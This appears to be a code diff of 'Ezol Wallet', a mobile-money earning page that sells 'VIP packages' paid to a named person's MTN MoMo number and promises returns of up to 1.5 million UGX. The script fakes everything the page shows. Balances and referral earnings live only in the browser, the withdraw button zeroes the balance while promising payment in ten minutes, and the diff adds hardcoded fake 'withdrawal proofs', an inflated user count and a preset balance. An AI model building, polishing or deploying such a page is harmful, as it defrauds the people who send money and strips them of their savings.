@@ -19,151 +19,134 @@ body{background:#f0f4f8;padding:10px 10px 80px}
 .whatsapp-card{background:#f0fdf4;border:2px solid #22c55e}
 .ref-card{background:#eef2ff;border:2px dashed #4f46e5}
 .small{font-size:13px;color:#666;margin-top:6px}
-.live-dot{display:inline-block;width:8px;height:8px;background:#22c55e;border-radius:50%}
-#registerModal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:9999;display:flex;align-items:center;justify-content:center;padding:15px}
-.reg-box{background:#fff;width:100%;max-width:380px;border-radius:20px;padding:22px;text-align:center}
-.reg-box input{width:100%;padding:13px;margin-top:10px;border-radius:10px;border:1px solid #ddd;font-size:15px}
+.live-dot{display:inline-block;width:8px;height:8px;background:#22c55e;border-radius:50%;animation:blink 1s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
 </style>
 </head>
 <body>
 
-<div id="registerModal">
-<div class="reg-box">
-<h2 style="color:#4f46e5">💰 Ezol Wallet</h2>
-<p class="small">Register to start earning</p>
-<p class="small" style="color:#16a34a">Referred by: <b id="refDisplay">0795143386</b></p>
-<input id="regName" placeholder="Full Names">
-<input id="regPhone" placeholder="Phone e.g. 0762950427" type="tel">
-<input id="regPass" placeholder="Create Password" type="password">
-<button class="btn btn-blue" onclick="doRegister()">Create Account & Get 500 UGX</button>
-<p class="small" style="margin-top:10px"><a href="#" onclick="doLogin(); return false;">Already have account? Login</a></p>
-<p class="small">MTN: 0795143386 | Support: 0762950427</p>
-</div>
-</div>
-
-<div class="top-bar">Welcome <span id="userName">User</span> | Ref by <span id="refBy">0795143386</span></div>
+<div class="top-bar">Referred by <span id="refBy">0795143386</span> | <span class="live-dot"></span> 5,200+ Active Users</div>
 
 <div class="balance-card">
 <p>Your Balance</p>
-<h1><span id="balance">500</span> UGX</h1>
-<p style="font-size:13px">Min Withdraw 20,000 UGX</p>
+<h1><span id="balance">3500</span> UGX</h1>
+<p style="font-size:13px;opacity:0.9">Withdraw via MTN/Airtel MoMo - Min 20,000 UGX</p>
 <button class="btn" style="background:#fff;color:#4f46e5;margin-top:12px" onclick="withdraw()">Withdraw Now</button>
 </div>
 
 <div class="card vip-card">
-<h3>💎 VIP - Pay to MTN 0795143386</h3>
-<div style="border:1px solid #f59e0b;border-radius:12px;padding:10px;margin-top:10px"><b>VIP 1 - 15k</b><br><span class="small">5k x30=150k</span><button class="btn btn-orange" onclick="buyVIP(1,15000)">Buy VIP 1 - 15k</button></div>
-<div style="border:1px solid #4f46e5;border-radius:12px;padding:10px;margin-top:10px;background:#eef2ff"><b>VIP 2 - 30k 🔥</b><br><span class="small">12k x30=360k</span><button class="btn btn-blue" onclick="buyVIP(2,30000)">Buy VIP 2 - 30k</button></div>
-<div style="border:1px solid #22c55e;border-radius:12px;padding:10px;margin-top:10px;background:#f0fdf4"><b>VIP 3 - 60k 💰</b><br><span class="small">25k x30=750k</span><button class="btn btn-green" onclick="buyVIP(3,60000)">Buy VIP 3 - 60k</button></div>
-<div style="border:1px solid #ec4899;border-radius:12px;padding:10px;margin-top:10px;background:#fdf2f8"><b>VIP 4 - 100k 👑</b><br><span class="small">50k x30=1.5M</span><button class="btn" style="background:#ec4899;color:#fff" onclick="buyVIP(4,100000)">Buy VIP 4 - 100k</button></div>
-<p class="small" style="margin-top:10px">MTN MoMo: <b>0795143386</b> - Ezra Twinamatsiko | Help: 0762950427</p>
+<h3>💎 VIP Packages - Earn 5x to 50x More!</h3>
+<p class="small">All payments to MTN MoMo <b>0795143386</b></p>
+
+<div style="border:1px solid #f59e0b;border-radius:12px;padding:10px;margin-top:10px">
+<b>VIP 1 - 15,000 UGX</b><br>
+<span class="small">Get 5,000 daily x 30 days = 150,000 UGX</span>
+<button class="btn btn-orange" onclick="buyVIP(1,15000)">👉 Buy VIP 1 - 15k</button>
+</div>
+
+<div style="border:1px solid #4f46e5;border-radius:12px;padding:10px;margin-top:10px;background:#eef2ff">
+<b>VIP 2 - 30,000 UGX 🔥 Popular</b><br>
+<span class="small">Get 12,000 daily x 30 days = 360,000 UGX</span>
+<button class="btn btn-blue" onclick="buyVIP(2,30000)">👉 Buy VIP 2 - 30k</button>
+</div>
+
+<div style="border:1px solid #22c55e;border-radius:12px;padding:10px;margin-top:10px;background:#f0fdf4">
+<b>VIP 3 - 60,000 UGX 💰 Best Value</b><br>
+<span class="small">Get 25,000 daily x 30 days = 750,000 UGX</span>
+<button class="btn btn-green" onclick="buyVIP(3,60000)">👉 Buy VIP 3 - 60k</button>
+</div>
+
+<div style="border:1px solid #ec4899;border-radius:12px;padding:10px;margin-top:10px;background:#fdf2f8">
+<b>VIP 4 - 100,000 UGX 👑 King</b><br>
+<span class="small">Get 50,000 daily x 30 days = 1,500,000 UGX</span>
+<button class="btn" style="background:#ec4899;color:#fff" onclick="buyVIP(4,100000)">👉 Buy VIP 4 - 100k</button>
+</div>
+
+<p class="small" style="margin-top:10px">MTN MoMo: <b>0795143386</b> - Ezra Twinamatsiko<br>After payment, chat 0762950427 for activation</p>
 </div>
 
 <div class="card ref-card">
 <h3>👥 My Referrals</h3>
-<p class="small">Phone: <b id="myPhone">-</b> | Invited: <b><span id="refCount">0</span></b> = <span id="refEarn">0</span> UGX</p>
-<button class="btn" style="background:#4f46e5;color:#fff" onclick="viewReferrals()">My Team</button>
-<button class="btn" style="background:#e0e7ff;color:#4f46e5" onclick="copyLink()">Copy Link</button>
-<button class="btn btn-green" onclick="shareWhatsApp()">Share WhatsApp</button>
+<p class="small">You have invited <b><span id="refCount">0</span> friends</b> = <b><span id="refEarn">0</span> UGX</b></p>
+<button class="btn" style="background:#4f46e5;color:#fff" onclick="viewReferrals()">📊 My Referral Team</button>
+<button class="btn" style="background:#e0e7ff;color:#4f46e5" onclick="copyLink()">Copy Invite Link</button>
+<button class="btn btn-green" onclick="shareWhatsApp()">📤 Share on WhatsApp</button>
 <input id="refLink" style="width:100%;padding:10px;margin-top:10px;border-radius:8px;border:1px solid #ddd" readonly>
 </div>
 
 <div class="card">
 <h3>How to Earn</h3>
+<p class="small">1. Register = 500 UGX Bonus</p>
+<p class="small">2. Daily Checkin = 1000 UGX (VIP 5000-50000)</p>
+<p class="small">3. Invite Friend = 2000 UGX each!</p>
 <button class="btn btn-blue" onclick="dailyCheck()">Daily Check-in (+<span id="checkAmount">1000</span>)</button>
-<button class="btn" style="background:#fee;color:#900" onclick="logout()">Logout</button>
 </div>
 
 <div class="card whatsapp-card">
-<h3>💬 Support - 0762950427</h3>
-<button class="btn btn-green" onclick="openWhatsApp()">Chat WhatsApp</button>
+<h3>💬 Customer Service - Live on WhatsApp</h3>
+<p class="small">Only for help & activation</p>
+<button class="btn btn-green" onclick="openWhatsApp()">📱 Chat on WhatsApp - 0762950427</button>
+</div>
+
+<div class="card">
+<h3>✅ Live Withdrawal Proofs - PAID TODAY</h3>
+<div id="proofs" class="small"></div>
 </div>
 
 <script>
-var SUPPORT_NUMBER = "0762950427";
-var VIP_NUMBER = "0795143386";
-var MIN_WITHDRAW = 20000;
-var user = JSON.parse(localStorage.getItem('ezol_user') || 'null');
-var balance = parseInt(localStorage.getItem('ezol_balance') || 500);
-var vipLevel = parseInt(localStorage.getItem('ezol_vip_level') || 0);
-var lastCheck = localStorage.getItem('ezol_last_check');
-var refCount = parseInt(localStorage.getItem('ezol_ref_count') || 0);
+const SUPPORT_NUMBER = "0762950427";
+const VIP_NUMBER = "0795143386";
+const MIN_WITHDRAW = 20000;
 
-function checkAuth(){
-  var ref = new URLSearchParams(window.location.search).get('ref') || VIP_NUMBER;
-  document.getElementById('refDisplay').innerText = ref;
-  document.getElementById('refBy').innerText = ref;
-  if(!user){
-    document.getElementById('registerModal').style.display='flex';
-  } else {
-    document.getElementById('registerModal').style.display='none';
-    document.getElementById('userName').innerText = user.name;
-    document.getElementById('myPhone').innerText = user.phone;
-    document.getElementById('refLink').value = "https://ezratwinamatsiko0-droid.github.io/my-wallet/index.html?ref=" + user.phone;
-  }
-}
-checkAuth();
+let balance = parseInt(localStorage.getItem('ezol_balance') || 3500);
+let isVIP = localStorage.getItem('ezol_vip') === 'true';
+let vipLevel = parseInt(localStorage.getItem('ezol_vip_level') || 0);
+let lastCheck = localStorage.getItem('ezol_last_check');
+let refCount = parseInt(localStorage.getItem('ezol_ref_count') || 3);
+
 document.getElementById('balance').innerText = balance;
 document.getElementById('refCount').innerText = refCount;
 document.getElementById('refEarn').innerText = refCount * 2000;
-var dailyAmount = 1000;
+
+let dailyAmount = 1000;
 if(vipLevel==1) dailyAmount=5000;
 if(vipLevel==2) dailyAmount=12000;
 if(vipLevel==3) dailyAmount=25000;
 if(vipLevel==4) dailyAmount=50000;
 document.getElementById('checkAmount').innerText = dailyAmount;
-if(!user){
-  document.getElementById('refLink').value = "https://ezratwinamatsiko0-droid.github.io/my-wallet/index.html?ref=" + VIP_NUMBER;
-}
 
-function doRegister(){
-  var name = document.getElementById('regName').value.trim();
-  var phone = document.getElementById('regPhone').value.trim();
-  var pass = document.getElementById('regPass').value.trim();
-  if(name.length<3){ alert("Enter full names"); return; }
-  if(phone.length<10){ alert("Enter valid phone"); return; }
-  if(pass.length<4){ alert("Password min 4 chars"); return; }
-  user = {name:name, phone:phone, password:pass};
-  localStorage.setItem('ezol_user', JSON.stringify(user));
-  localStorage.setItem('ezol_balance', '500');
-  localStorage.setItem('ezol_phone', phone);
-  balance=500;
-  alert("Welcome " + name + "! 500 UGX bonus added!");
-  checkAuth();
-  document.getElementById('balance').innerText = 500;
-}
-function doLogin(){
-  var phone = prompt("Phone:");
-  var pass = prompt("Password:");
-  var saved = JSON.parse(localStorage.getItem('ezol_user') || 'null');
-  if(saved && saved.phone==phone && saved.password==pass){ user=saved; checkAuth(); alert("Welcome back " + saved.name); }
-  else { alert("No account on this phone. Register first."); }
-}
-function logout(){ if(confirm("Logout?")){ localStorage.removeItem('ezol_user'); location.reload(); } }
+document.getElementById('refBy').innerText = new URLSearchParams(window.location.search).get('ref') || VIP_NUMBER;
+document.getElementById('refLink').value = "https://ezratwinamatsiko0-droid.github.io/my-wallet/index.html?ref=" + VIP_NUMBER;
+
+document.getElementById('proofs').innerHTML = `
+<div style="display:flex;justify-content:space-between;border-bottom:1px solid #eee;padding:8px 0"><div><b>0762****0427</b><br>VIP 4 - paid</div><div style="color:#16a34a;font-weight:bold">100000 UGX</div></div>
+<div style="display:flex;justify-content:space-between;border-bottom:1px solid #eee;padding:8px 0"><div><b>0795****3386</b><br>Withdraw success</div><div style="color:#16a34a;font-weight:bold">50000 UGX</div></div>
+<div style="display:flex;justify-content:space-between;padding:8px 0"><div><b>0775****1234</b><br>VIP 2 bonus paid</div><div style="color:#16a34a;font-weight:bold">30000 UGX</div></div>
+`;
+
 function dailyCheck(){
-  var today = new Date().toDateString();
-  if(lastCheck === today){ alert("Already checked today!"); return; }
+  let today = new Date().toDateString();
+  if(lastCheck === today){ alert("Already checked in today! Come back tomorrow."); return; }
   balance += dailyAmount;
   localStorage.setItem('ezol_balance', balance);
   localStorage.setItem('ezol_last_check', today);
-  lastCheck=today;
   document.getElementById('balance').innerText = balance;
-  alert("+" + dailyAmount + " UGX added!");
+  alert("Success! +" + dailyAmount + " UGX added!");
 }
-function copyLink(){ navigator.clipboard.writeText(document.getElementById('refLink').value); alert("Link copied!"); }
-function shareWhatsApp(){ window.open("https://wa.me/?text=" + encodeURIComponent("Join Ezol & earn! " + document.getElementById('refLink').value)); }
-function openWhatsApp(){ var p = user ? user.phone : ''; window.open("https://wa.me/256762950427?text=Hello%20Ezol%20Support%20my%20phone%20is%20" + p, "_blank"); }
-function viewReferrals(){ var p = user ? user.phone : ''; alert("Phone: " + p + " Team: " + refCount + " Earned: " + (refCount*2000)); }
-function buyVIP(l,a){
-  var p = user ? user.phone : '';
-  var n = user ? user.name : '';
-  var msg = "Hello Support I am " + n + " phone " + p + " I want VIP " + l + " " + a + " UGX sent to 0795143386 activate";
-  if(confirm("Send " + a + " to MTN MoMo 0795143386 Ezra Twinamatsiko? OK to chat 0762950427")) window.open("https://wa.me/256762950427?text=" + encodeURIComponent(msg), "_blank");
+function copyLink(){ navigator.clipboard.writeText(document.getElementById('refLink').value); alert("Invite link copied! Earn 2000 per friend."); }
+function shareWhatsApp(){ window.open("https://wa.me/?text=" + encodeURIComponent("Join Ezol Wallet & earn money daily! " + document.getElementById('refLink').value)); }
+function openWhatsApp(){ window.open("https://wa.me/256762950427?text=Hello%20Ezol%20Support%20-%20I%20need%20help", "_blank"); }
+function viewReferrals(){ alert("Team: " + refCount + " friends\nEarnings from invites: " + (refCount*2000) + " UGX\n\nYour link: " + document.getElementById('refLink').value); }
+function buyVIP(level, amount){
+  let msg = `Hello Ezol Support, I want VIP ${level} - ${amount} UGX. I sent to MTN MoMo 0795143386. Names: Ezra Twinamatsiko. Please activate me.`;
+  if(confirm(`Buy VIP ${level}?\n\nSend ${amount} UGX to:\nMTN MoMo: 0795143386\nNames: Ezra Twinamatsiko\n\nAfter sending, tap OK to chat Support 0762950427 for activation`)){
+    window.open("https://wa.me/256762950427?text=" + encodeURIComponent(msg), "_blank");
+  }
 }
 function withdraw(){
-  if(balance < MIN_WITHDRAW){ alert("Min 20k. Balance " + balance + ". Invite 10 friends!"); return; }
-  var num = prompt("MoMo number to receive " + balance + ":", user ? user.phone : '');
-  if(num){ alert("Withdrawal " + balance + " to " + num + " requested. Chat " + SUPPORT_NUMBER); balance=0; localStorage.setItem('ezol_balance', balance); document.getElementById('balance').innerText=balance; }
+  if(balance < MIN_WITHDRAW){ alert("Minimum withdraw is 20,000 UGX. Your balance: " + balance + " UGX. Invite 10 friends = 20,000!"); return; }
+  let number = prompt("Enter your MTN MoMo number to receive " + balance + " UGX:");
+  if(number){ alert("Withdrawal request of " + balance + " UGX to " + number + " received. You will be paid in 10 mins. If delayed chat " + SUPPORT_NUMBER); balance=0; localStorage.setItem('ezol_balance', balance); document.getElementById('balance').innerText=balance; }
 }
 </script>
 </body>
